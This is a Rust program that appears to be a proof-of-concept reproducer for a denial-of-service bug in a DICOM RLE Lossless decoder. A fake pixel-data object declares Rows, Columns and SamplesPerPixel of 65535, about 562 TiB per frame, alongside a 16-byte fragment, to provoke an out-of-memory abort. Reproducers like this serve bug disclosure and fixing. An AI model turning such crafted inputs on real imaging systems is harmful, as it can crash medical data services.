use dicom_encoding::adapters::{PixelDataObject, RawPixelData};
use dicom_transfer_syntax_registry::{TransferSyntaxIndex, TransferSyntaxRegistry};
use std::borrow::Cow;

/// A `PixelDataObject` whose declared Rows/Columns/SamplesPerPixel are wildly disproportionate to
/// the (tiny, well-formed) actual encapsulated fragment - exactly what a real DICOM+RLE decode
/// pipeline would receive if a file's header attributes were crafted (or simply corrupted) to
/// disagree with the actual pixel data payload size.
struct FakePixelData {
    fragment: Vec<u8>,
}

impl PixelDataObject for FakePixelData {
    fn transfer_syntax_uid(&self) -> &str {
        "1.2.840.10008.1.2.5"
    }
    fn rows(&self) -> Option<u16> {
        Some(65535)
    }
    fn cols(&self) -> Option<u16> {
        Some(65535)
    }
    fn samples_per_pixel(&self) -> Option<u16> {
        Some(65535)
    }
    fn bits_allocated(&self) -> Option<u16> {
        Some(16)
    }
    fn bits_stored(&self) -> Option<u16> {
        Some(16)
    }
    fn photometric_interpretation(&self) -> Option<&str> {
        Some("MONOCHROME2")
    }
    fn number_of_frames(&self) -> Option<u32> {
        Some(1)
    }
    fn number_of_fragments(&self) -> Option<u32> {
        Some(1)
    }
    fn fragment(&self, fragment: usize) -> Option<Cow<'_, [u8]>> {
        if fragment == 0 {
            Some(Cow::Borrowed(&self.fragment))
        } else {
            None
        }
    }
    fn offset_table(&self) -> Option<Cow<'_, [u32]>> {
        None
    }
    fn raw_pixel_data(&self) -> Option<RawPixelData> {
        None
    }
}

fn main() {
    let ts = TransferSyntaxRegistry
        .get("1.2.840.10008.1.2.5")
        .expect("RLE Lossless should be registered");
    let reader = ts
        .pixel_data_reader()
        .expect("RLE Lossless should have a pixel data reader (the `rle` feature is enabled)");

    // A tiny, well-formed-looking RLE fragment (16 bytes: NumberOfSegments = 1, one segment
    // covering the whole (small) fragment). Nothing about this fragment itself is malicious - the
    // only attacker lever pulled is the DICOM object's own Rows/Columns/SamplesPerPixel/
    // BitsAllocated header attributes, which claim a frame of
    // 65535 * 65535 * 65535 * 2 bytes =~ 562 TiB, entirely unrelated to this real 16-byte payload.
    let mut fragment = vec![0u8; 16];
    fragment[0..4].copy_from_slice(&1u32.to_le_bytes());
    fragment[4..8].copy_from_slice(&16u32.to_le_bytes());

    let expected_frame_bytes: u128 = 65535u128 * 65535 * 65535 * 2;
    println!(
        "declared frame size: {expected_frame_bytes} bytes (~{:.1} TiB) from Rows=Columns=SamplesPerPixel=65535, BitsAllocated=16",
        expected_frame_bytes as f64 / (1024.0 * 1024.0 * 1024.0 * 1024.0)
    );
    println!("actual encapsulated fragment size: {} bytes", fragment.len());

    let src = FakePixelData { fragment };
    let mut dst = Vec::new();

    // If the process is still alive to print past this point, the decoder did not abort on the
    // declared-size allocation alone - it either failed gracefully with a normal `Result::Err`,
    // or (given enough real memory) actually attempted/completed the allocation. A SIGABRT/OOM
    // kill before this point, driven purely by disproportionate header metadata rather than any
    // malformed fragment content, is the bug.
    let result = reader.decode(&src, &mut dst);
    match result {
        Ok(()) => println!("did not reproduce - decode unexpectedly succeeded"),
        Err(e) => println!(
            "did not reproduce - decode failed gracefully with a normal Result::Err: {:?}",
            e
        ),
    }
}
